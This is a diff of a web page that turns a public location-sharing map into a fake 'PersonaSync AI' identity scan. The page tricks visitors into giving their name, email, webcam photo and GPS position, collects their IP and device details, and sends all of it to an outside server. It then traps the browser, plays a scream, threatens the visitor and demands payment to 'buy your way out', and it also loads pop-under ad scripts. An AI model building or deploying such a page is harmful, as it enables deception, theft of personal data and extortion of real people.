@@ -1,256 +1,718 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta http-equiv="Delegate-CH" content="Sec-CH-UA https://s.pemsrv.com; Sec-CH-UA-Mobile https://s.pemsrv.com; Sec-CH-UA-Arch https://s.pemsrv.com; Sec-CH-UA-Model https://s.pemsrv.com; Sec-CH-UA-Platform https://s.pemsrv.com; Sec-CH-UA-Platform-Version https://s.pemsrv.com; Sec-CH-UA-Bitness https://s.pemsrv.com; Sec-CH-UA-Full-Version-List https://s.pemsrv.com; Sec-CH-UA-Full-Version https://s.pemsrv.com;">
+  <!-- Meta Preview for PersonaSync AI (Professional Phase Only) -->
+  <title>PersonaSync AI — Identity Profiler</title>
+  <meta name="title" content="PersonaSync AI — Identity Profiler">
+  <meta name="description" content="Initiate your scan with PersonaSync AI. A personalized analysis experience powered by next-gen behavioral models.">
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://techdaily.ai/">
+  <meta property="og:title" content="PersonaSync AI — Identity Profiler">
+  <meta property="og:description" content="Initiate your scan with PersonaSync AI. A personalized analysis experience powered by next-gen behavioral models.">
+  <meta property="og:image" content="https://clickbait-two.vercel.app/Prev.jpg">
+
+  <!-- Twitter -->
+  <meta property="twitter:card" content="summary_large_image">
+  <meta property="twitter:url" content="https://techdaily.ai/">
+  <meta property="twitter:title" content="PersonaSync AI — Identity Profiler">
+  <meta property="twitter:description" content="Initiate your scan with PersonaSync AI. A personalized analysis experience powered by next-gen behavioral models.">
+  <meta property="twitter:image" content="https://clickbait-two.vercel.app/Prev.jpg">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Roboto+Mono&display=swap" rel="stylesheet">
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Public Location Wall</title>
-  
-  <!-- Leaflet -->
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-  
+  <title>PersonaSync AI — Identity Profiler</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
   <style>
-    body { 
-      margin:0; 
-      font-family: system-ui, sans-serif; 
-      background:#111; 
-      color:#eee; 
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
+    :root {
+      /* Light Theme */
+      --main-bg: linear-gradient(145deg, #eaf2ff, #ffffff);
+      --card-bg: rgba(255, 255, 255, 0.9);
+      --primary: #2563eb;
+      --accent: #60a5fa;
+      --text-color: #1f2937;
+
+      /* Slam Theme */
+      --scare-bg: #000000;
+      --scare-text: crimson;
+      --scare-glow: #ff0033;
+
+      /* Fonts */
+      --font-main: 'Poppins', sans-serif;
+      --font-mono: 'Roboto Mono', monospace;
     }
-    #map { 
-      flex: 1;
-      display: none;           /* hidden at first */
+
+    body {
+      margin: 0;
+      font-family: var(--font-main);
+      background: var(--main-bg);
+      color: var(--text-color);
+      overflow-x: hidden;
     }
-    .intro-screen {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
+
+    .container {
+      max-width: 600px;
+      margin: 60px auto;
+      padding: 40px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      backdrop-filter: blur(8px);
+      transition: all 0.4s ease;
+    }
+
+    h1 {
+      font-size: 2rem;
+      color: var(--primary);
       text-align: center;
-      background: rgba(0,0,0,0.8);
+      margin-bottom: 16px;
     }
-    .intro-screen.hidden {
+
+    p {
+      font-size: 1rem;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      font-size: 1em;
+      border-radius: 10px;
+      box-sizing: border-box;
+    }
+
+    input {
+      border: 1px solid #d1d5db;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: var(--primary);
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.4);
+    }
+
+    button {
+      background: var(--primary);
+      color: white;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #1e40af;
+    }
+
+    #formWarning {
+      color: #d97706;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    #video, #canvas {
+      display: block;
+      margin: 20px auto;
+      border-radius: 16px;
+      max-width: 100%;
+      width: 320px;
+      height: auto;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+
+    #map, #returnMap {
+      height: 300px;
+      width: 100%;
+      margin-top: 20px;
+      border-radius: 14px;
+      overflow: hidden;
+    }
+
+    .hidden {
       display: none;
     }
-    input, button {
-      margin: 12px;
-      padding: 12px 20px;
-      font-size: 1.1em;
-      border-radius: 6px;
+
+    /* Scare Mode */
+    .scare {
+      background: var(--scare-bg) !important;
+      color: var(--scare-text) !important;
+      font-family: var(--font-mono);
+      text-align: center;
       border: none;
+      box-shadow: 0 0 60px var(--scare-glow);
     }
-    button {
-      background: #e53e3e;
+
+    .scare h1 {
+      font-size: 2.2em;
+      margin-bottom: 20px;
+      animation: flicker 0.1s infinite alternate;
+      text-shadow: 0 0 8px var(--scare-glow);
+      letter-spacing: 1px;
+    }
+
+    .scare p {
+      font-size: 1.1em;
+      line-height: 1.6;
+      color: var(--scare-text);
+    }
+
+    .scare img {
+      margin: 10px auto;
+      border: 3px solid var(--scare-text);
+      border-radius: 10px;
+      display: block;
+      max-width: 300px;
+      width: 100%;
+      box-shadow: 0 0 25px var(--scare-glow);
+    }
+
+    @keyframes flicker {
+      from { opacity: 1; }
+      to { opacity: 0.2; }
+    }
+
+    .scare .glitch {
+      position: relative;
+      display: inline-block;
+      color: var(--scare-text);
+    }
+
+    .scare .glitch::before,
+    .scare .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+      width: 100%;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+    }
+
+    .scare .glitch::before {
+      animation: glitchTop 0.8s infinite linear alternate-reverse;
+      color: #f0f;
+      top: -2px;
+    }
+
+    .scare .glitch::after {
+      animation: glitchBottom 0.8s infinite linear alternate-reverse;
+      color: #0ff;
+      top: 2px;
+    }
+
+    @keyframes glitchTop {
+      0% { clip: rect(0, 9999px, 0, 0); }
+      100% { clip: rect(0, 9999px, 20px, 0); }
+    }
+
+    @keyframes glitchBottom {
+      0% { clip: rect(20px, 9999px, 40px, 0); }
+      100% { clip: rect(0, 9999px, 20px, 0); }
+    }
+    .regret-button {
+      display: inline-block;
+      margin-top: 30px;
+      padding: 14px 24px;
+      font-size: 1em;
+      font-family: var(--font-mono);
+      background: crimson;
       color: white;
-      cursor: pointer;
+      text-decoration: none;
+      border-radius: 10px;
+      box-shadow: 0 0 12px crimson;
+      transition: background 0.3s ease, transform 0.2s ease;
+      animation: flicker 0.15s infinite alternate;
     }
-    button:hover { background: #c53030; }
-    #username { width: 280px; }
-    .status { color: #ffcc00; margin: 15px 0; max-width: 500px; }
+
+    .regret-button:hover {
+      background: #8b0000;
+      transform: scale(1.05);
+      box-shadow: 0 0 18px crimson;
+    }
   </style>
-
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
-    import { getDatabase, ref, push, onValue, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
-
-    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyC5LJ34tIqk83QLSrNqaDgHY_BGD5hoBuk",
-  authDomain: "mapmap-1d259.firebaseapp.com",
-  databaseURL: "https://mapmap-1d259-default-rtdb.firebaseio.com",
-  projectId: "mapmap-1d259",
-  storageBucket: "mapmap-1d259.firebasestorage.app",
-  messagingSenderId: "255184564192",
-  appId: "1:255184564192:web:1b26b87dbe29a67f1f4585",
-  measurementId: "G-L190BWDBFC"
-};
-    // ======================================================
-
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-
-    let map = null;
-    let markers = null;
-
-    const mapContainer = document.getElementById('map');
-    const intro = document.querySelector('.intro-screen');
-    const usernameInput = document.getElementById('username');
-    const shareBtn = document.getElementById('shareBtn');
-    const statusEl = document.getElementById('status');
-
-    function updateStatus(msg) {
-      statusEl.textContent = msg;
-      console.log("Status:", msg);
-    }
-
-    function initMap() {
-      if (map) return;
-
-      map = L.map('map', { center: [30, 0], zoom: 2 });
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
-        maxZoom: 19
-      }).addTo(map);
-
-      markers = L.markerClusterGroup();
-      map.addLayer(markers);
-
-      const locationsRef = ref(db, 'public_locations');
-      const recentQuery = query(locationsRef, limitToLast(500));
-
-      onValue(recentQuery, (snapshot) => {
-        markers.clearLayers();
-        const data = snapshot.val();
-        console.log("Firebase data received:", data);
-        if (!data) return;
-
-        Object.values(data).forEach(point => {
-          if (!point.lat || !point.lng) return;
-          const marker = L.marker([point.lat, point.lng]);
-          marker.bindPopup(`
-            <b>${point.nickname || '???'}</b><br>
-            ${new Date(point.timestamp).toLocaleString()}<br>
-            <small>${point.lat.toFixed(5)}, ${point.lng.toFixed(5)}</small>
-          `);
-          markers.addLayer(marker);
-        });
-
-        if (markers.getLayers().length > 0 && !map._fitDone) {
-          map.fitBounds(markers.getBounds(), { padding: [50, 50] });
-          map._fitDone = true;
-        }
-      });
-
-      setTimeout(() => map.invalidateSize({ pan: false }), 300);
-    }
-
-    async function requestLocationPermissionAndShare() {
-      const nickname = usernameInput.value.trim();
-      if (!nickname) {
-        updateStatus("Please enter your username first!");
-        usernameInput.focus();
-        return;
-      }
-
-      const consent = confirm(
-        `⚠️  VERY IMPORTANT  ⚠️\n\n` +
-        `Hello ${nickname},\n` +
-        `Your EXACT location + username will be PUBLIC on this map!\n` +
-        `Anyone can see it. This is high privacy risk!\n\n` +
-        `Continue only if you understand.`
-      );
-      if (!consent) return;
-
-      // Hide intro, show map
-      intro.classList.add('hidden');
-      mapContainer.style.display = 'block';
-      initMap();
-
-      // Step 1: Check current permission state
-      if (!navigator.permissions || !navigator.permissions.query) {
-        updateStatus("Your browser doesn't support permission checking. Trying to request location...");
-        getLocation();
-        return;
-      }
-
-      try {
-        const permissionStatus = await navigator.permissions.query({ name: "geolocation" });
-        console.log("Current geolocation permission state:", permissionStatus.state);
-
-        if (permissionStatus.state === "denied") {
-          updateStatus(
-            "Location access is permanently blocked for this site.\n\n" +
-            "Fix: Click the lock icon next to the URL → Site settings → Location → set to 'Ask (default)' or 'Allow'\n" +
-            "Then refresh the page."
-          );
-          return;
-        }
-
-        if (permissionStatus.state === "granted") {
-          updateStatus("Location already allowed → getting position...");
-          getLocation();
-          return;
-        }
-
-        // state === "prompt" → normal case, prompt will show when we call getCurrentPosition
-        updateStatus("Requesting location permission... (browser prompt should appear now)");
-        getLocation();
-
-      } catch (err) {
-        console.error("Permission query error:", err);
-        updateStatus("Couldn't check permission state. Trying directly...");
-        getLocation();
-      }
-    }
-
-    function getLocation() {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude: lat, longitude: lng } = position.coords;
-          console.log("Location success:", lat, lng);
-          updateStatus(`Location acquired! Sharing as ${usernameInput.value.trim()}...`);
-
-          push(ref(db, 'public_locations'), {
-            lat,
-            lng,
-            nickname: usernameInput.value.trim(),
-            timestamp: Date.now()
-          }).then(() => {
-            alert(`Success! Your location is now on the map as ${usernameInput.value.trim()}`);
-          }).catch(err => {
-            console.error("Firebase push error:", err);
-            alert("Location got but failed to share: " + err.message);
-          });
-        },
-        (error) => {
-          console.error("Geolocation error:", error);
-          let msg = "Location error: ";
-          switch(error.code) {
-            case 1: // PERMISSION_DENIED
-              msg += "Permission denied or blocked. Check browser/site settings → Location → reset to 'Ask'";
-              break;
-            case 2:
-              msg += "Position unavailable (no GPS/network?)";
-              break;
-            case 3:
-              msg += "Request timed out – try again";
-              break;
-            default:
-              msg += error.message;
-          }
-          updateStatus(msg);
-          alert(msg);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,      // 15 seconds – give user time
-          maximumAge: 0
-        }
-      );
-    }
-
-    shareBtn.addEventListener('click', requestLocationPermissionAndShare);
-  </script>
 </head>
 <body>
 
-  <div class="intro-screen">
-    <h1>Public Location Wall</h1>
-    <p style="max-width: 600px; margin: 20px auto;">
-      <strong>Warning:</strong> This map shows real user locations publicly.<br>
-      High privacy risk – only continue if you accept that.
-    </p>
+<audio id="scream" src="https://cdn.pixabay.com/download/audio/2022/03/10/audio_09968be149.mp3?filename=girl-scream-45657.mp3" preload="auto"></audio>
 
-    <input type="text" id="username" placeholder="Enter your username/nickname" required>
-    <button id="shareBtn">Show map & share my location</button>
-    <div id="status" class="status"></div>
+<!-- Step 1: Onboarding -->
+<div id="step1" class="container">
+  <h1>PersonaSync AI Scan</h1>
+  <p>Begin your personality analysis. All data is confidential and used for personalized insights.</p>
+  <input type="text" id="realName" placeholder="Full Name" required />
+  <input type="email" id="email" placeholder="Email Address" required />
+  <div id="formWarning" style="color: orange; min-height: 1.5em;"></div>
+  <button onclick="validateAndNextStep()">Begin Scan</button>
+</div>
+
+<!-- Step 2: Webcam -->
+<div id="step2" class="container hidden">
+  <h1>Face Verification</h1>
+  <p>Please enable your camera. Align your face and capture your expression.</p>
+  <video id="video" width="300" height="250" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  <br />
+  <button onclick="capturePhoto()">Capture</button>
+  <button onclick="submitPhoto()">Submit</button>
+  <div id="warning"></div>
+</div>
+
+<!-- Step 3: Location -->
+<div id="step3" class="container hidden">
+  <h1>Location Matching</h1>
+  <p>We are syncing personality archetypes with regional behavioral traits. Please allow location access.</p>
+  <button onclick="getLocation()">Allow GPS Access</button>
+</div>
+
+<!-- Step 4: Loading -->
+<div id="step4" class="container hidden">
+  <h1>Analyzing...</h1>
+  <p id="analyzingText">Preparing data profile...</p>
+</div>
+
+<!-- Step 5: Slam -->
+  <!-- Step 5: Slam -->
+  <div id="step5" class="container scare hidden">
+    <h1 class="glitch" data-text="YOU'VE BEEN PROFILED.">YOU'VE BEEN PROFILED.</h1>
+    <p><strong>Name:</strong> <span id="outName"></span></p>
+    <p><strong>Email:</strong> <span id="outEmail"></span></p>
+    <p><strong>IP Address:</strong> <span id="ipDisplay"></span></p>
+    <p><strong>Device:</strong> <span id="deviceDisplay"></span></p>
+    <p><strong>Location:</strong></p>
+    <div id="map"></div>
+    <p><strong>Face Capture:</strong></p>
+    <img id="scareImg" src="" width="300" />
+    <p class="scare">You're exposed. You're owned. Welcome to submission.</p>
+    <p><strong>Repent. Compensate. Buy your way out.</strong></p>
+    <button class="regret-button" onclick="showBuyout()">Buy Your Regret</button>
   </div>
 
-  <div id="map"></div>
+  <!-- Step 6: Return Visit Scare -->
+  <div id="returnScreen" class="container scare hidden">
+    <h1 class="glitch" data-text="YOU TRIED TO ESCAPE">YOU TRIED TO ESCAPE</h1>
+    <p>Welcome back, <span id="returnName"></span>.</p>
+    <p>We still have your email: <strong id="returnEmail"></strong></p>
+    <p><strong>Face:</strong></p>
+    <img id="returnImg" src="" width="300" style="border: 3px solid crimson; border-radius: 10px;" />
+    <p id="returnDevice"></p>
+    <p id="returnIP"></p>
+    <div id="returnMap" style="height: 300px; width: 100%; margin-top: 20px;"></div>
+    <p class="scare">You’re already profiled. You belong to us now.</p>
+    <p><strong>Submission is non-negotiable. Redemption is not free.</strong></p>
+    <button class="regret-button" onclick="showBuyout()">Buy Your Regret</button>
+  </div>
 
+  <div id="buyout-flow" class="container scare hidden">
+  <h1 class="glitch" data-text="Buy Your Way Out">Buy Your Way Out</h1>
+  <p>
+    To earn redemption, copy your unique <strong>Loser ID</strong> and proceed to secure payment below.
+  </p>
+
+  <p>
+    <strong>Your Loser ID:</strong>
+    <span id="loser-id-display" style="font-family: monospace; color: crimson;"></span>
+  </p>
+
+  <button id="copy-id">Copy ID</button>
+  <button id="proceed-pay">Proceed to Payment</button>
+  <button onclick="show('step5')">Cancel</button>
+
+  <p id="buyout-status" style="margin-top:10px; color: crimson;"></p>
+</div>
+
+<script>
+  // Step Navigation
+  function show(id) {
+    document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+    document.getElementById(id).classList.remove('hidden');
+  }
+  
+  const username = localStorage.getItem("sub_name") || "Unknown";
+const email = localStorage.getItem("sub_email") || "No email";
+const webcamPicture = localStorage.getItem("sub_img");
+const lat = localStorage.getItem("lat");
+const lon = localStorage.getItem("lon");
+const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+// Step 2: Fetch IP and build payload
+fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(data => {
+    const ip = data.ip;
+
+    const finalData = {
+      username,
+      ip,
+      location: mapsLink, // location is now a Google Maps link
+      webcamPicture,
+      timestamp: new Date().toLocaleString()
+    };
+
+    sendToXpolo(finalData, email);
+  });
+
+// Step 3: Xpolo submission
+async function sendToXpolo(data, email) {
+  const submissionPayload = {
+    name: data.username,
+    ip: data.ip,
+    location: data.location,
+    timestamp: data.timestamp,
+    webcamBase64: data.webcamPicture,
+    humiliation: "Oops, I clicked a fake AI scan.",
+    domme: "",
+    origin: "clickbait",
+    bio: `
+Email: ${email}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Screen: ${screen.width}x${screen.height}
+Referrer: ${document.referrer || 'Direct'}
+User-Agent: ${navigator.userAgent}
+`.trim()
+  };
+
+  try {
+    const res = await fetch("https://xpolo-production.up.railway.app/api/linky-submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(submissionPayload)
+    });
+
+    const result = await res.json();
+    console.log("Xpolo saved:", result);
+    if (result.id) {
+  localStorage.setItem("xpolo_id", result.id);
+}
+  } catch (err) {
+    console.error("Xpolo submission failed:", err);
+  }
+}
+
+  function submitReceipt() {
+    const receiptId = document.getElementById("receipt-id").value.trim();
+    const payStatus = document.getElementById("pay-status");
+
+    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+    const receiptRegex = /^#?\d{4}-\d{4}$/;
+
+    if (uuidRegex.test(receiptId) || receiptRegex.test(receiptId)) {
+      payStatus.textContent = "Receipt accepted. You are temporarily forgiven.";
+      payStatus.style.color = "limegreen";
+      setTimeout(() => {
+        localStorage.clear();
+        location.reload();
+      }, 2000);
+    } else {
+      payStatus.textContent = "Invalid receipt. Try again.";
+      payStatus.style.color = "crimson";
+    }
+  }
+
+  function nextStep() {
+    if (!document.getElementById("step1").classList.contains("hidden")) {
+      show("step2");
+    } else if (!document.getElementById("step2").classList.contains("hidden")) {
+      show("step3");
+    } else if (!document.getElementById("step3").classList.contains("hidden")) {
+      show("step4");
+      setTimeout(runScare, 3000);
+    }
+  }
+
+  function validateFormInputs() {
+    const name = document.getElementById("realName").value.trim();
+    const email = document.getElementById("email").value.trim();
+    const warning = document.getElementById("formWarning");
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (name.length < 2) {
+      warning.textContent = "Enter your full name.";
+      return false;
+    }
+
+    if (!emailRegex.test(email)) {
+      warning.textContent = "Enter a valid email address.";
+      return false;
+    }
+
+    warning.textContent = "";
+    return true;
+  }
+
+  function validateAndNextStep() {
+    if (validateFormInputs()) {
+      requestCameraAndAdvance();
+    }
+  }
+
+  // Webcam
+  // Setup camera
+  let lastCaptureBrightnessOK = false;
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
+  const warning = document.getElementById("warning");
+
+  function requestCameraAndAdvance() {
+    video.setAttribute("playsinline", true);
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        show("step2");
+      })
+      .catch(err => {
+        alert("Camera access denied or failed: " + err.message);
+      });
+  }
+
+  // Capture and brightness check
+  function capturePhoto() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const data = imageData.data;
+
+    let totalBrightness = 0;
+    let pixelCount = 0;
+
+    for (let i = 0; i < data.length; i += 4) {
+      const r = data[i];
+      const g = data[i + 1];
+      const b = data[i + 2];
+      const brightness = 0.299 * r + 0.587 * g + 0.114 * b;
+      totalBrightness += brightness;
+      pixelCount++;
+    }
+
+    const avgBrightness = totalBrightness / pixelCount;
+    const threshold = 20;
+
+    if (avgBrightness < threshold) {
+      warning.textContent = "Too dark. Fix your lighting.";
+      canvas.style.border = "2px solid red";
+      lastCaptureBrightnessOK = false;
+    } else {
+      warning.textContent = "";
+      canvas.style.border = "2px dashed crimson";
+      lastCaptureBrightnessOK = true;
+    }
+
+    return lastCaptureBrightnessOK;
+  }
+
+  // Submit action
+  function submitPhoto() {
+    if (!lastCaptureBrightnessOK) {
+      warning.textContent = "Retake your photo. It’s too dark.";
+      canvas.style.border = "2px solid red";
+      return;
+    }
+
+    alert("Face accepted. Proceeding...");
+    show("step3")
+    
+    // Insert your transition to next screen here
+  }
+
+  // Geolocation
+  function getLocation() {
+    navigator.geolocation.getCurrentPosition(pos => {
+      localStorage.setItem("lat", pos.coords.latitude);
+      localStorage.setItem("lon", pos.coords.longitude);
+      nextStep();
+    });
+  }
+
+  // Slam Logic
+  function runScare() {
+    show("step5");
+    
+    
+
+    document.getElementById("scream").play();
+
+    // Fullscreen
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen().catch(() => {});
+    }
+
+    // Prevent back navigation
+    history.pushState(null, "", location.href);
+    window.onpopstate = () => location.reload();
+
+    for (let i = 0; i < 10; i++) {
+      history.pushState({}, "", location.href);
+    }
+
+    // Keyboard trap
+    document.addEventListener("keydown", e => {
+      if (["F11", "F5"].includes(e.key) || (e.ctrlKey && ["r", "w", "n", "t"].includes(e.key.toLowerCase()))) {
+        e.preventDefault();
+      }
+    });
+
+    const name = document.getElementById("realName").value;
+    const email = document.getElementById("email").value;
+    const canvas = document.getElementById("canvas");
+    const face = canvas.toDataURL("image/png");
+
+    document.getElementById("outName").textContent = name;
+    document.getElementById("outEmail").textContent = email;
+    document.getElementById("scareImg").src = face;
+    document.getElementById("deviceDisplay").textContent = navigator.userAgent;
+
+    const lat = localStorage.getItem("lat");
+    const lon = localStorage.getItem("lon");
+    if (lat && lon) {
+      const map = L.map('map').setView([lat, lon], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+      L.marker([lat, lon]).addTo(map).bindPopup("This is you.").openPopup();
+    }
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => document.getElementById("ipDisplay").textContent = data.ip);
+
+    // Store for return screen
+    localStorage.setItem("sub_name", name);
+    localStorage.setItem("sub_email", email);
+    localStorage.setItem("sub_img", face);
+    
+    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(data => {
+    const ip = data.ip;
+
+    const finalData = {
+      username: name,
+      ip,
+      location: mapsLink,
+      webcamPicture: face,
+      timestamp: new Date().toLocaleString()
+    };
+
+    sendToXpolo(finalData, email);
+  });
+  }
+  
+      
+
+  // Return screen logic
+  window.addEventListener("DOMContentLoaded", () => {
+    const name = localStorage.getItem("sub_name");
+    const email = localStorage.getItem("sub_email");
+    const img = localStorage.getItem("sub_img");
+    const lat = localStorage.getItem("lat");
+    const lon = localStorage.getItem("lon");
+
+    if (name && email && img) {
+      show("returnScreen");
+
+      document.getElementById("returnName").textContent = name;
+      document.getElementById("returnEmail").textContent = email;
+      document.getElementById("returnImg").src = img;
+
+      // Device Info
+      document.getElementById("returnDevice").innerHTML = `<strong>Device:</strong> ${navigator.userAgent}`;
+
+      // IP Address
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("returnIP").innerHTML = `<strong>IP Address:</strong> ${data.ip}`;
+        });
+
+      // Play scream
+      try {
+        document.getElementById("scream").play();
+      } catch {}
+
+      // Map (if GPS was allowed previously)
+      if (lat && lon) {
+        const map = L.map('returnMap').setView([lat, lon], 13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        L.marker([lat, lon]).addTo(map).bindPopup("We know where you are.").openPopup();
+      }
+    }
+  });
+  
+  function showBuyout() {
+  const loserId = localStorage.getItem("xpolo_id") || "UNKNOWN";
+  document.getElementById("loser-id-display").textContent = loserId;
+  show("buyout-flow");
+}
+
+function copyLoserId() {
+  const id = document.getElementById("loser-id-display").textContent;
+  navigator.clipboard.writeText(id).then(() => {
+    alert("Loser ID copied to clipboard.");
+  });
+}
+// === Stripe Buyout Integration ===
+document.getElementById("copy-id").addEventListener("click", () => {
+  const loserId = document.getElementById("loser-id-display").textContent;
+  navigator.clipboard.writeText(loserId)
+    .then(() => document.getElementById("buyout-status").textContent = "Copied to clipboard!")
+    .catch(() => document.getElementById("buyout-status").textContent = "Failed to copy ID.");
+});
+
+document.getElementById("proceed-pay").addEventListener("click", async () => {
+  const uuid = document.getElementById("loser-id-display").textContent.trim();
+  const status = document.getElementById("buyout-status");
+
+  if (!uuid || uuid === "UNKNOWN") {
+    status.textContent = "No valid ID found. Capture or expose yourself first.";
+    return;
+  }
+
+  status.textContent = "Preparing payment session...";
+
+  try {
+    const res = await fetch("https://xpolo-production.up.railway.app/api/moderation/pay", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ uuid })
+    });
+
+    const data = await res.json();
+    if (data.url) {
+      status.textContent = "Redirecting to Stripe checkout...";
+      setTimeout(() => window.location.href = data.url, 1000);
+    } else {
+      status.textContent = "Error: Could not start payment session.";
+    }
+  } catch (err) {
+    console.error(err);
+    status.textContent = "Network or server error.";
+  }
+});
+  
+</script>
+<script type="text/javascript">
+   var uid = '488537';
+   var wid = '737418';
+   var pop_tag = document.createElement('script');pop_tag.src='//cdn.popcash.net/show.js';document.body.appendChild(pop_tag);
+   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//cdn2.popcash.net/show.js';document.body.appendChild(pop_tag)};
+</script>
+<script type="text/javascript">
+   var uid = '488537';
+   var wid = '738600';
+   var pop_tag = document.createElement('script');pop_tag.src='//cdn.popcash.net/show.js';document.body.appendChild(pop_tag);
+   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//cdn2.popcash.net/show.js';document.body.appendChild(pop_tag)};
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"6d62be9c7e25413aae59f819083d049c","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
